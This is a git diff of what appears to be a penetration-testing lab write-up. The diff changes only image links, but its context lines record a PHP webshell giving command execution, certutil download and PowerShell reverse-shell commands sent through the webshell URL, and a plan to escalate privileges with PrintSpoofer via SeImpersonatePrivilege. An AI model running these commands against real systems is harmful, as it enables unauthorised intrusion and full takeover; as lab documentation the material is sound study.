@@ -198,7 +198,7 @@ Shell("cmd /c powershell -c C:/Windows/Tasks/offsec.ps1")
 
 #### - Attempted to write to the directory to confirm write permissions and found we did have write permissions:
 
-![](Images/Pasted%20image%2020230406182621.png)
+![](Pasted%20image%2020230407231750.png)
 
 #### - Googled "php one liner command shell"
 
@@ -210,8 +210,7 @@ Shell("cmd /c powershell -c C:/Windows/Tasks/offsec.ps1")
 
 #### - Navigated to http://192.168.98.169/cmd.php?cmd=whoami in firefox and found we have command execution as apache
 
-![](Images/Pasted%20image%2020230406182312.png)
-
+![](Pasted%20image%2020230407231839.png)
 
 ## Lateral Movement vector
 # PHP Webshell
@@ -220,7 +219,7 @@ Shell("cmd /c powershell -c C:/Windows/Tasks/offsec.ps1")
 
 #### - Created a powershell reverse shell named reverse.ps1:
 
-![](Images/Pasted%20image%2020230407203747.png)
+![](Pasted%20image%2020230407231917.png)
 
 #### - Started an http server in the directory with the reverse.ps1 to host the file
 
@@ -232,7 +231,7 @@ http://192.168.98.169/cmd.php?cmd=certutil.exe%20-urlcache%20-split%20-f%20http:
 
 http://192.168.98.169/cmd.php?cmd=cmd /c powershell -c C:/xampp/htdocs/reverse.ps1
 
-![](Images/Pasted%20image%2020230407204340.png)
+![](Pasted%20image%2020230407232026.png)
 ---
 
 # Privilege Escalation
@@ -240,12 +239,12 @@ http://192.168.98.169/cmd.php?cmd=cmd /c powershell -c C:/xampp/htdocs/reverse.p
 
 #### - Typed whoami /all and found the apache user has SeImpersonatePrivilege enabled
 
-![](Images/Pasted%20image%2020230407205251.png)
+![](Pasted%20image%2020230407232107.png)
 
 #### - Typed systeminfo to see the box is running Windows Server 2019 Standard on OS Version 10.0.17763 and x64 based PC
 
-![](Images/Pasted%20image%2020230407205700.png)
-![](Images/Pasted%20image%2020230407210050.png)
+![](Pasted%20image%2020230407232156.png)
+
 
 #### - Googled "Windows Server 2019 Standard SeImpersonate privilege escalation" and found the following webpage to utilize PrintSpoofer64.exe to escalate privileges:
 
